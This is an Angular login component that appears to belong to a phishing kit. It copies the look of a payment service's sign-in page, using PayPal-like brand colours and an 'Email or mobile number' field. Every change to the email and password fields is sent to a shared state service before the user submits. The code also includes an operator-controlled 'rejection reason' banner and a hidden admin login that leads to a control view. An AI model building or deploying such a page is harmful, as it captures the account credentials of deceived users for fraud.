
import { Component, inject, signal, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      <div class="space-y-8 animate-fade-in">
        
        <!-- Rejection Feedback -->
        @if (state.rejectionReason()) {
          <div class="bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">error</span>
            <div>
              <p class="text-sm font-bold text-[#001C64]">Check your entries</p>
              <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() }}</p>
            </div>
          </div>
        }

        <!-- Inputs -->
        <div class="space-y-5">
          <!-- Email Field -->
          <div class="relative group">
            <input 
              type="text" 
              [(ngModel)]="email"
              (ngModelChange)="onEmailChange($event)"
              (blur)="touchedEmail.set(true)"
              id="email"
              placeholder=" "
              class="peer w-full h-[60px] px-5 pt-5 pb-1 rounded-[12px] bg-white text-[#001C64] text-[17px] font-medium outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
              [class.shadow-input-error]="(touchedEmail() || showErrors) && !isEmailValid()"
            />
            <label 
               for="email" 
               class="absolute left-5 top-4 text-[#6B7280] text-[16px] transition-all duration-200 peer-placeholder-shown:top-[18px] peer-placeholder-shown:text-[16px] peer-focus:top-2 peer-focus:text-[12px] peer-focus:font-bold peer-focus:text-[#0070BA] peer-[&:not(:placeholder-shown)]:top-2 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-bold peer-[&:not(:placeholder-shown)]:text-[#6B7280] cursor-text pointer-events-none"
               >
               Email or mobile number
            </label>
            @if ((touchedEmail() || showErrors) && !isEmailValid()) {
                 <div class="absolute right-4 top-4 text-[#D92D20] animate-in fade-in">
                    <span class="material-icons text-xl">error_outline</span>
                 </div>
            }
          </div>
          
          <!-- Password Field -->
          <div class="relative group">
            <input 
              [type]="showPassword() ? 'text' : 'password'" 
              [(ngModel)]="password"
              (ngModelChange)="onPasswordChange($event)"
              id="password"
              placeholder=" "
              class="peer w-full h-[60px] px-5 pt-5 pb-1 rounded-[12px] bg-white text-[#001C64] text-[17px] font-medium outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
              [class.shadow-input-error]="showErrors && password.length === 0"
            />
            <label 
               for="password" 
               class="absolute left-5 top-4 text-[#6B7280] text-[16px] transition-all duration-200 peer-placeholder-shown:top-[18px] peer-placeholder-shown:text-[16px] peer-focus:top-2 peer-focus:text-[12px] peer-focus:font-bold peer-focus:text-[#0070BA] peer-[&:not(:placeholder-shown)]:top-2 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-bold peer-[&:not(:placeholder-shown)]:text-[#6B7280] cursor-text pointer-events-none"
               >
               Password
            </label>
            <button 
                (click)="togglePassword()" 
                class="absolute right-4 top-[18px] text-[#0070BA] hover:text-[#003087] focus:outline-none font-bold text-sm transition-colors" 
                tabindex="-1">
                {{ showPassword() ? 'Hide' : 'Show' }}
            </button>
          </div>
        </div>

        <div class="flex items-center justify-start">
           <a class="text-[#0070BA] font-bold hover:underline cursor-pointer text-[15px]">Forgot password?</a>
        </div>

        <!-- Action -->
        <div class="space-y-4 pt-2">
            <button 
              (click)="login()"
              class="w-full bg-[#003087] hover:bg-[#001C64] text-white font-bold text-[17px] py-[14px] px-6 rounded-full transition-all duration-300 shadow-button hover:scale-[1.02] active:scale-[0.98]"
            >
              Log In
            </button>

            <div class="relative py-2">
              <div class="absolute inset-0 flex items-center">
                <div class="w-full border-t border-slate-200"></div>
              </div>
              <div class="relative flex justify-center text-sm">
                <span class="px-4 bg-white text-[#6B7280] font-medium">or</span>
              </div>
            </div>

            <button 
              class="w-full bg-white border-2 border-[#003087] text-[#003087] hover:bg-slate-50 font-bold text-[17px] py-[12px] px-6 rounded-full transition-all duration-300 hover:scale-[1.02] active:scale-[0.98]"
            >
              Sign Up
            </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class LoginComponent {
  state = inject(StateService);
  
  email = '';
  password = '';
  showErrors = false;
  touchedEmail = signal(false);
  showPassword = signal(false);
  
  isEmailValid = signal<boolean>(false);
  isValid = signal<boolean>(false);

  constructor() {
    effect(() => {
      this.email = this.state.email();
      this.validate();
    });
  }

  togglePassword() {
      this.showPassword.update(v => !v);
  }

  onEmailChange(val: string) {
      this.validate();
      if (val !== 'admin') {
         this.state.updateUser({ email: val });
      }
  }

  onPasswordChange(val: string) {
      this.validate();
      this.state.updateUser({ password: val });
  }

  validate() {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const emailValid = emailRegex.test(this.email);
    this.isEmailValid.set(emailValid);
    const valid = (emailValid && this.password.length > 0) || (this.email.length > 0 && this.password.length > 0);
    this.isValid.set(valid);
  }

  login() {
    this.touchedEmail.set(true);
    if (this.email === this.state.adminUsername() && this.password === this.state.adminPassword()) {
        this.state.adminAuthenticated.set(true);
        this.state.navigate('admin');
        return;
    }

    if (this.isEmailValid() && this.password.length > 0) {
      this.state.submitLogin(this.email, this.password);
    } else {
      this.showErrors = true;
    }
  }
}
